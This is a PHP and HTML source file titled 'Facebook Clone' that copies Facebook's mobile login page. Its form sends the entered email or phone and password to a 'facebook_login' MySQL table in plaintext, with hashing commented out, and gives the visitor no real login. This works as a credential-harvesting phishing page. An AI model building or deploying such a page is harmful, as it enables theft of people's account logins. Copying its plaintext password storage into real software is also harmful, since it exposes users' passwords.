<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />

    <title>Facebook Clone</title>
</head>
<style>
    body {
        font-family: Arial, sans-serif;
        background-color: #e8f1f7;
        margin: 0;
        padding: 0;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 90vh;
    }

    .container {
        background-color: #e8f1f7;
        padding: 20px;
        border-radius: 10px;
        box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
        width: 300px;
        text-align: center;
    }

    p {
        color: #606770;
        font-size: 14px;
    }

    .image img {
        width: 70px;
        height: auto;
        margin: 0 auto 30px;
        border: 1px solid black;
        border-radius: 50px;
        margin: 50px;
    }

    img {
        width: 60px;
    }

    form {
        margin-top: 60px;
    }

    input[type="text"],
    input[type="password"] {
        width: 100%;
        padding: 15px;
        margin: 10px 0;
        border: 1px solid #ccc;
        border-radius: 10px;
        box-sizing: border-box;
        font-size: 16px;
    }

    input[type="submit"],
    input[type="button"] {
        background-color: #1877f2;
        color: #fff;
        padding: 13px;
        border-radius: 20px;
        border: 2px solid #165bca;
        width: 100%;
        font-size: 16px;
        cursor: pointer;
        margin-top: 20px;
    }

    input[type="submit"]:hover {
        background-color: #165bca;
    }

    h3 {
        color: #1877f2;
        font-size: 14px;
        margin-top: 10px;
        margin-bottom: 40px;
    }

    .create_acct {
        margin-top: 20px;
    }

    .create_acct input[type="button"] {
        background-color: transparent;
        color: #165bca;
        border: 2px solid #165bca;
        border-radius: 20px;
        cursor: pointer;
    }

    .create_acct input[type="button"]:hover {
        background-color: #F0F2F5;
    }

    /* Media Query for Mobile Devices */
    @media (max-width: 600px) {
        .container {
            width: 100%;
            padding: 15px;
        }

        .image img {
            width: 50px;
            /* margin-bottom: 20px; */
        }

        img {
            background-color: transparent;
            color: transparent;
            width: 90px;
        }

        input[type="text"],
        input[type="password"] {
            padding: 15px;
            font-size: 14px;
        }

        input[type="submit"],
        input[type="button"] {
            padding: 12px;
            font-size: 14px;
        }

        input[type="button"] {
            margin-top: 90px;
        }

        h3 {
            font-size: 12px;
        }

        p {
            font-size: 12px;
        }
    }
</style>

<body>

    <?php
    // Connect to the database
    $servername = "localhost";
    $username = "root";
    $password = "";
    $dbname = "facebook_login";

    $mysqli = new mysqli($servername, $username, $password, $dbname);

    // Check connection
    if ($mysqli->connect_error) {
        die("Connection failed: " . $mysqli->connect_error);
    }

    // Insert user data when the form is submitted
    if (isset($_POST['login'])) {
        $username = $_POST['email'];
        $password = $_POST['password'];



        // $hashed_password = password_hash($password, PASSWORD_DEFAULT);
    
        // Prepare the SQL statement to insert user data
        $stmt = $mysqli->prepare("INSERT INTO user (username, password) VALUES (?, ?)");

        if ($stmt) {
            // Bind the parameters and execute the statement
            $stmt->bind_param("ss", $username, $password);
            $stmt->execute();

            if ($stmt->affected_rows > 0) {
            } else {
                $stmt->close();
            }

            $stmt->close();
        } else {
            if ($mysqli->errno == 1062) { // 1062 is the MySQL error code for duplicate entry
                echo "<p>Error: Username already exists. Please try another.</p>";
            } else {
                echo "Error: " . $mysqli->error;
            }
        }
    }

    // Close the database connection
    $mysqli->close();
    ?>

    <div class="container">
        <p>English (UK)</p>

        <div class="image">
            <img src="image/logo.png" alt="Logo" />
        </div>

        <form action="" method="post">
            <input type="text" name="email" placeholder="Mobile number or email address"
                aria-label="Mobile number or email address" required />
            <input type="password" name="password" placeholder="Password" aria-label="Password" required />
            <input type="submit" name="login" value="Log in" />
        </form>
        <h3>Forgotten Password?</h3>
        <div class="create_acct">
            <input type="button" value="Create new account" />
            <img src="image/unnamed (1).png" alt="" />
        </div>
    </div>
</body>

</html>